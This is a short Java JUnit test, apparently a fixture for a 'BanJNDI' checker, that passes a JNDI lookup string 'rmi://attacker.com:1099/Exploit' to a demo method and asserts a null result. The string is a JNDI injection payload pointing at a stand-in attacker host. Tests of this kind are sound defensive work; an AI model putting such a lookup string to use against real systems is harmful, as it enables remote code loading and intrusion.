import org.junit.Test;
import static org.junit.Assert.*;

public class JNDIDemoTest {

    @Test
    public void testShowBug() {
        JNDIDemo demo = new JNDIDemo();
        Object result = demo.showBug("rmi://attacker.com:1099/Exploit"); // TRIGGER BUG: BanJNDI
        assertNull(result);
    }
}